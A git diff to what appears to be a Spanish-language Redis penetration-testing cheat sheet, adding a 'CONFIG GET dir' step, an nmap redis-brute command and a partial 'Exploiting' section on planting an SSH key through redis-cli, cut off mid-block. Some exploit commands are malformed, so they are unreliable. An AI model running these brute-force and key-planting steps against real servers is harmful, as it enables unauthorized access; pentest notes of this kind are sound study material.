@@ -30,10 +30,27 @@ HGETALL KEYNAME
 ```
 #### Autenticarse en el servico redis
 ```
-AUTH ùsername
+AUTH username
+```
+#### Obtener directorio del usuario redis
+```
+CONFIG GET dir
 ```
 ## Ataque por fuerza bruta
 ### Nmap Script
 ```nmap
 nmap -p PORT --script redis-brute IP
 ```
+## Exploiting
+### Add ssh key
+* 1. Obtener el directorio de redis
+```
+CONFIG GET dir
+```
+* 2. Comprueba si tienes acceso al .ssh de el usuario redis
+```
+CONFIG GET /redis/dir/.ssh
+```
+* 3. Pasamos nuestra clave a esa carpeta
+```
+cat rsa_key | redis-cli -h IP -z set_key
